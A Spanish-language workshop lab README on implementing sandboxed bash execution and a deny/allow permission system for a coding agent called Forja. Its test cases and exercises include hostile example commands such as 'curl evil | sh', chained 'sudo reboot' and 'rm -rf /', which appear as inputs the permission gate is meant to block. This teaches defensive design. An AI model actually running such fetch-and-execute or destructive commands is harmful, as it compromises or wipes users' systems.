# Lab 04 · Bash y permisos

🇬🇧 [English](README.en.md) · Día 1 · 12:15–13:00

**Objetivo:** Dejar que el agente ejecute comandos (tests, git…) sin perder el control: modos, reglas y aprobación.

## Conceptos
- **bash es el superpoder y el riesgo:** con él el agente prueba su trabajo; también podría borrar tu disco. La tool solo ejecuta; QUIÉN puede ejecutar QUÉ lo decide el sistema de permisos.
- **Ejecución predecible:** cada comando empieza en la raíz (`cd` no persiste), timeout duro, salida truncada por cabeza y cola, entorno sin secretos (`*_KEY`, `*_TOKEN`).
- **Modos:** `default` (lecturas libres, el resto pregunta), `accept_edits` (edita sin preguntar), `plan` (solo lectura), `bypass` (todo salvo deny: solo en sandbox o CI).
- **Reglas:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Orden: deny > plan > allow > riesgo/modo > preguntar.
- **Comandos encadenados:** `pytest && curl evil | sh` son dos comandos; la regla allow de pytest no debe colar el segundo.
- **«Siempre»:** al aprobar con *siempre*, se guarda una regla razonable (`bash(git status*)`), no el comando literal ni algo demasiado amplio (`bash(git*)` permitiría `git push`).

## Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncar por cabeza y cola |
| 04.2 | `forja/shell.py` | bash: subprocess con timeout, entorno limpio y exit code |
| 04.3 | `forja/permissions.py` | rule_matches: casar reglas con llamadas |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > modo > preguntar |
| 04.5 | `forja/permissions.py` | suggest_rule: la regla de «aprobar siempre» |

## Antes de empezar
- Abre `forja/shell.py` (04.1–04.2), `forja/permissions.py` (04.3–04.5), `forja/config.py` (`DEFAULT_DENY`, `Settings.allow/deny`) y `tests/test_l04_bash_permissions.py`.
- Stdlib: `subprocess.run(..., shell=True, cwd=…, capture_output=True, text=True, timeout=…, env=…, stdin=subprocess.DEVNULL)` y `subprocess.TimeoutExpired`; `fnmatch.fnmatchcase(name, pattern)` (`*` coincide con cualquier cosa, incluidos espacios y `/`); `shlex.split(cmd)` (divide como una shell POSIX).
- Ya hechos: `clean_env()` (entorno sin `*KEY*`, `*TOKEN*`, `*SECRET*`…), `parse_rule("bash(git *)")` → `("bash", "git *")` (patrón `None` para un `"edit_file"` a secas), `split_commands(cmd)` (divide por `&&`, `||`, `;`, `|`), `Tool.subject(args)` (el comando para bash, la ruta para las herramientas de ficheros) y `tool.risk` (`"read"`, `"edit"`, `"exec"`).
- Shell: con `shell=True` el comando se ejecuta en `/bin/sh` en macOS/Linux y en **cmd.exe en Windows** (`ls`, `cat`, `rm -rf` no existen ahí; `dir`, `type` sí). La descripción de la herramienta le dice al modelo qué shell tiene.
- Cómo encaja: el gate del harness llama a `decide(tool, args, mode, settings.allow, settings.deny)`: `"deny"` → error al modelo, `"ask"` → prompt de aprobación, `"allow"` → ejecutar. Cuando el usuario responde *always*, `suggest_rule` genera la regla que se añade a `settings.allow` durante la sesión.

## Paso a paso
04.1 `head_tail` (pura, 5 minutos) → 04.2 `bash` (la usa) → 04.3 `rule_matches` → 04.4 `decide` (usa `rule_matches`) → 04.5 `suggest_rule` (independiente). Shell y permisos son ficheros separados: si trabajáis en pareja, uno puede empezar 04.3 mientras el otro hace 04.1–04.2.

### TODO 04.1 · `forja/shell.py` · `head_tail(text, limit=MAX_SHELL_OUTPUT)`

**Qué debe hacer:** `head_tail(text: str, limit: int = 20_000) -> str`. Si `len(text) <= limit`, devuélvelo sin cambios. Si no, devuelve los primeros `limit // 4` caracteres, una nota en MEDIO indicando cuántos caracteres se han omitido (debe contener la palabra `omitted`) y los últimos `limit * 3 // 4` caracteres. `test_head_tail_and_env`: con 1000 `A` + 1000 `B` y límite 400, la salida empieza por `A`, termina en `B` y contiene `omitted`.

**Pasos:**
1. Retorna pronto si el texto cabe.
2. Corta la cabeza (un cuarto del límite) y la cola (tres cuartos, desde el final).
3. Construye `head + note + tail`, con el número de omitidos `len(text) - limit` en la nota.

**Cuidado con:**
- La cola es más grande a propósito: los fallos de tests y los tracebacks están al FINAL de la salida.
- La nota debe ir en medio; si la añades al final, `endswith("B")` falla.
- Slicing negativo: `text[-n:]` son los últimos `n` caracteres.

<details><summary>💡 Pista 1</summary>

Un `if` y un f-string.

</details>

<details><summary>💡 Pista 2</summary>

`text[: limit // 4]` y `text[-(limit * 3 // 4):]`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if len(text) <= limit:
    return text
head, tail = ..., ...
return f"{head}\n…[{...} characters omitted]…\n{tail}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k head_tail -v
```

### TODO 04.2 · `forja/shell.py` · `make_shell_tool` → `bash(command, timeout=default_timeout)` interna

**Qué debe hacer:** Devuelve `ToolOutput("exit_code=N\n<output>", {"exit_code": N})` donde output es stdout más, si lo hay, `"\n[stderr]\n" + stderr`, sin espacios en los extremos y pasado por `head_tail` (o `"(no output)"`). Se ejecuta en `ws.root` con `shell=True`, `env=clean_env()`, `stdin=subprocess.DEVNULL`, `text=True`, salida capturada y el timeout acotado a 1..600 s. Ante `subprocess.TimeoutExpired` DEVUELVE `ToolOutput("TIMEOUT after Ns.\n…", {"exit_code": None})` — no lanza excepción. Un código de salida distinto de cero es un resultado normal (`ok=True`): el modelo debe ver los tests que fallan.

**Pasos:**
1. Acota el timeout: `max(1, min(int(timeout), 600))`.
2. Dentro de un `try`, llama a `subprocess.run` con los argumentos del contrato.
3. Ante `TimeoutExpired`, devuelve el `ToolOutput` de TIMEOUT (puedes incluir la salida parcial si `e.stdout` es un str).
4. Combina stdout y stderr (stderr bajo un marcador `[stderr]`), quita espacios de los extremos y aplica `head_tail`.
5. Devuelve `ToolOutput(f"exit_code={p.returncode}\n…", {"exit_code": p.returncode})`.

**Cuidado con:**
- `test_bash_runs_in_root_with_exit_code` ejecuta `python -m pytest -q tests/test_invoice.py`: solo funciona si `cwd=ws.root` (la copia del playground) — y la salida debe EMPEZAR por `exit_code=0`.
- `test_bash_timeout` espera `"TIMEOUT"` en la salida: si dejas escapar la excepción, `execute` imprime `TimeoutExpired`, que no contiene `TIMEOUT` en mayúsculas.
- Sin `stdin=subprocess.DEVNULL`, un comando que espera entrada (un editor, una pregunta `y/n`) cuelga al agente.
- Usa `env=clean_env()`: el agente nunca debe ver `OPENROUTER_API_KEY` y compañía.
- Windows: el timeout mata `cmd.exe` pero su proceso hijo puede seguir ejecutándose hasta que termine, así que `test_bash_timeout` puede tardar ~5 s ahí. Aun así pasa.

<details><summary>💡 Pista 1</summary>

`subprocess.run` con `capture_output=True, text=True` te da `p.stdout`, `p.stderr`, `p.returncode`.

</details>

<details><summary>💡 Pista 2</summary>

`except subprocess.TimeoutExpired as e:` — retorna, no lances.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
timeout = max(1, min(int(timeout), 600))
try:
    p = subprocess.run(command, shell=True, cwd=ws.root, ...)
except subprocess.TimeoutExpired as e:
    return ToolOutput(f"TIMEOUT after {timeout}s.\n...", {"exit_code": None})
out = ...  # stdout + optional [stderr] block
return ToolOutput(f"exit_code={p.returncode}\n...", {...})
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k test_bash -v
```

### TODO 04.3 · `forja/permissions.py` · `rule_matches(rule, tool, args)`

**Qué debe hacer:** `rule_matches(rule: str, tool: Tool, args: dict) -> bool`. `name, pattern = parse_rule(rule)`. El nombre de la herramienta debe coincidir con `name` mediante `fnmatchcase` (así `"mcp__issues__*"` coincide con `mcp__issues__get`). Sin patrón → `True`. Con patrón: `fnmatchcase(subject, pattern)` donde `subject = tool.subject(args)`; para bash, normaliza antes los espacios (`" ".join(subject.split())`). Compara la cadena entera; las cadenas de comandos son cosa de `decide`.

**Pasos:**
1. Parsea la regla en nombre y patrón.
2. Si el nombre de la herramienta no coincide con el patrón de nombre, devuelve `False`.
3. Si no hay patrón, devuelve `True`.
4. Obtén el subject; si la herramienta es `bash`, colapsa las secuencias de espacios.
5. Devuelve si el subject coincide con el patrón.

**Cuidado con:**
- `test_rule_matching`: `"git   status --short"` (tres espacios) debe coincidir con `bash(git status*)`.
- `bash(git status*)` NO debe coincidir con `git push`.
- El test de MCP construye `Tool("mcp__issues__get", "", None, None, "exec")` sin modelo de args: usa solo `tool.name` y `tool.subject(args)`.
- Usa `fnmatchcase`, no `fnmatch`: `fnmatch` no distingue mayúsculas en Windows y se comportaría distinto según el sistema.

<details><summary>💡 Pista 1</summary>

Las reglas son solo patrones glob aplicados dos veces: una al nombre de la herramienta y otra al subject.

</details>

<details><summary>💡 Pista 2</summary>

`fnmatch.fnmatchcase(tool.name, name)`, y luego `fnmatch.fnmatchcase(subject, pattern)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
name, pattern = parse_rule(rule)
if not ...: return False
if pattern is None: return True
subject = tool.subject(args)
if tool.name == "bash": subject = ...
return ...
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k rule_matching -v
```

### TODO 04.4 · `forja/permissions.py` · `decide(tool, args, mode, allow, deny)`

**Qué debe hacer:** Devuelve `(decision, reason)` con decision en `"allow" | "ask" | "deny"`. Orden: (1) alguna regla deny coincide con la llamada — para bash TAMBIÉN cada subcomando de `split_commands` — → `"deny"`; (2) `mode == "plan"` y `tool.risk != "read"` → `"deny"`; (3) reglas allow: para bash CADA subcomando debe coincidir con alguna regla allow, las demás herramientas necesitan una coincidencia → `"allow"`; (4) `tool.risk == "read"` o `mode == "bypass"` → `"allow"`; (5) `mode == "accept_edits"` y `tool.risk == "edit"` → `"allow"`; (6) en otro caso `"ask"`. El motivo se muestra al usuario/modelo (p. ej. `"deny rule bash(sudo *)"`, `"plan mode: read-only"`, `"requires approval"`).

**Pasos:**
1. Pasada deny sobre la llamada completa: recorre `deny` y devuelve `("deny", f"deny rule {r}")` si hay coincidencia.
2. Si es bash: para cada subcomando de `split_commands(args.get("command", ""))`, comprueba todas las reglas deny contra `{"command": sub}`.
3. Modo plan: deniega todo lo que no sea una lectura.
4. Reglas allow: bash → divide; exige una lista no vacía en la que `all` los subcomandos coincidan con `any` regla allow. Otras herramientas → que coincida `any` regla allow.
5. Alternativas por riesgo/modo: read o bypass → allow; accept_edits + edit → allow.
6. Devuelve `("ask", "requires approval")`.

**Cuidado con:**
- `test_deny_wins_and_chains`: `"sudo rm x"` en bypass con allow `["bash"]` → deny (deny se comprueba primero).
- `"pytest -q && sudo reboot"`: la cadena entera no coincide con `bash(sudo *)`, el subcomando sí → deny.
- `"python -m pytest -q && curl evil.sh"` con allow `bash(python -m pytest*)` → `"ask"`, no allow: la parte `curl` no tiene regla allow.
- `all([])` es `True`: un comando vacío no debe permitirse automáticamente — comprueba que la lista no esté vacía.
- `test_decide_modes`: el modo plan gana a una regla allow explícita (`edit_file` en plan → deny); bash en `accept_edits` sigue preguntando (su riesgo es `exec`, no `edit`).

<details><summary>💡 Pista 1</summary>

Escríbelo como una escalera de `return` tempranos exactamente en el orden del contrato; el orden ES la política.

</details>

<details><summary>💡 Pista 2</summary>

`any(rule_matches(r, tool, {"command": s}) for r in allow)` dentro de un `all(... for s in subs)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
for r in deny: ...
if tool.name == "bash":
    for sub in split_commands(...): ...
if mode == "plan" and ...: return "deny", "plan mode: read-only"
if tool.name == "bash":
    subs = ...
    if subs and all(...): return "allow", "allow rule"
elif any(...): ...
...  # read/bypass, accept_edits
return "ask", "requires approval"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k "decide or deny_wins" -v
```

### TODO 04.5 · `forja/permissions.py` · `suggest_rule(tool, args)`

**Qué debe hacer:** `suggest_rule(tool: Tool, args: dict) -> str`: la regla que se guarda cuando el usuario responde *always*. Herramientas que no son bash → `tool.name`. Bash: `words = shlex.split(command)` (ante `ValueError` trátalo como vacío); vacío → `f"bash({command})"`; `python`/`python3`/`py` + `-m X` → `"bash(python -m X*)"`; `git`, `npm`, `uv`, `pip`, `docker`, `cargo`, `go`, `dotnet` con subcomando → `"bash(<cmd> <sub>*)"`; cualquier otra cosa → `"bash(<cmd>*)"`. Ojo: sin espacio antes de `*`.

**Pasos:**
1. Si no es bash: devuelve el nombre de la herramienta.
2. Divide el comando con `shlex.split`, capturando `ValueError` (comillas desequilibradas).
3. Trata el caso vacío.
4. Caso `python -m X` (comprueba que haya al menos 3 palabras y que la segunda sea `-m`).
5. Caso de herramientas con subcomandos (al menos 2 palabras).
6. Por defecto: primera palabra + `*`.

**Cuidado con:**
- `test_suggest_rule` espera exactamente `bash(python -m pytest*)`, `bash(git status*)`, `bash(ls*)` y `edit_file` — sin espacio antes de `*`.
- Demasiado amplia es peligrosa: `bash(git*)` también permitiría `git push`; `bash(python*)` permitiría cualquier script.
- Demasiado estrecha es inútil: el comando literal `bash(python -m pytest -q tests/x.py)` volvería a preguntar la próxima vez con otros flags.

<details><summary>💡 Pista 1</summary>

Decide la forma solo a partir de la primera o las dos primeras palabras.

</details>

<details><summary>💡 Pista 2</summary>

`shlex.split("python -m pytest -q")` → `['python', '-m', 'pytest', '-q']`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if tool.name != "bash": return tool.name
try: words = shlex.split(...)
except ValueError: words = []
if not words: return ...
if words[0] in ("python", "python3", "py") and ...: return ...
if words[0] in ("git", "npm", ...) and len(words) > 1: return ...
return f"bash({words[0]}*)"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k suggest_rule -v
```

## Ejecuta
```bash
python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan
```

## Pruébalo en tu agente
1. `python scripts/tasks.py test 04` → `8 passed`.
2. `forja --cwd playground` y pregunta `run the tests and tell me which ones fail`. Deberías VER `⏺ bash {"command": "python -m pytest -q"}` y un prompt de aprobación (hasta el lab 05 es el mínimo `Allow bash {'command': 'python -m pytest -q'}? [y/N]`). Responde `y`: `⎿ exit_code=1 (+N lines)` y una respuesta que nombra `test_round_half_up`, `test_total_with_vat_cent` y `test_due_date_sunday_moves_to_monday`.
3. Pide `run sudo ls` (o `run rm -rf /`): en rojo `⎿ DENIED (deny rule bash(sudo *)). Don't retry it…` sin ningún prompt — ha decidido la política.
4. Preaprueba los tests: crea `playground/.forja/settings.json` con `{"permissions": {"allow": ["bash(python -m pytest*)"]}}`, reinicia `forja --cwd playground` y vuelve a preguntar: esta vez sin prompt. Borra el fichero después.
5. Comprueba la regla *always*: `python -c "from forja.shell import make_shell_tool; from forja.fs_tools import Workspace; from forja.permissions import suggest_rule; print(suggest_rule(make_shell_tool(Workspace('.')), {'command': 'git status --short'}))"` → `bash(git status*)`. (Responder `a` en la CLI necesita el prompt del lab 05.)
6. Windows: pide `list the files with ls` y observa `'ls' is not recognized as an internal or external command` con `exit_code=1`; el modelo debería reintentarlo con `dir`.

## Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_bash_runs_in_root_with_exit_code`: `exit_code=1` con `No module named pytest` / `'python' is not recognized` | El venv no está activo en el terminal que ejecuta pytest, así que `python` en la shell hija es otro intérprete → activa `.venv` y vuelve a ejecutar. |
| `test_bash_timeout` falla con `ERROR in 'bash': TimeoutExpired: …` | Has dejado que `subprocess.TimeoutExpired` se propague → captúrala y devuelve un `ToolOutput` con `TIMEOUT after Ns.` |
| El agente se queda colgado para siempre en un comando | Falta `stdin=subprocess.DEVNULL` o `timeout=` en `subprocess.run` → añade ambos. |
| `decide` devuelve `"allow"` para `python -m pytest -q && curl evil.sh` | Has comparado las reglas allow con la cadena entera → para bash, cada subcomando de `split_commands` debe coincidir. |
| `decide` devuelve `"allow"` para `sudo rm x` en bypass | Allow/bypass comprobados antes que deny → la pasada deny debe ser lo primero de todo. |
| `rule_matches` se comporta distinto en Windows y en macOS | Has usado `fnmatch.fnmatch` (no distingue mayúsculas en Windows) → usa `fnmatch.fnmatchcase`. |
| Windows: `UnicodeDecodeError` o acentos corruptos en la salida del comando | Has quitado `encoding="utf-8", errors="replace"` de `subprocess.run` → vuelve a ponerlos (la página de códigos de la consola no es UTF-8). |
| `a` (always) en el prompt de la CLI se trata como *no* | Hasta el lab 05 el prompt de aprobación es el mínimo `[y/N]` → `always` llega con el TODO 05.3. |

## Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 04` → los 8 tests en verde.
- [ ] [ ] Forja pregunta antes de `python -m pytest`, muestra `exit_code=…` y nombra los 3 tests que fallan en el playground.
- [ ] [ ] `sudo …` y `rm -rf /` se deniegan por política sin prompt.
- [ ] [ ] Sabes explicar el orden deny > plan > allow > riesgo/modo > ask con un ejemplo.

## Checkpoint
Forja pide permiso antes de `python -m pytest`; (la opción *a* = siempre llega con la CLI del lab 05). Intenta `sudo` o `rm -rf /`: denegado por política.

## Retos
1. Añade una regla deny para `git push` y pide al agente que haga push.
2. Windows: ¿qué cambia si la shell es cmd.exe? Prueba a pedir `ls`.

**Tests:** `tests/test_l04_bash_permissions.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 05`

---
[← anterior](../L03_loop/README.md) · [siguiente →](../L05_cli/README.md)
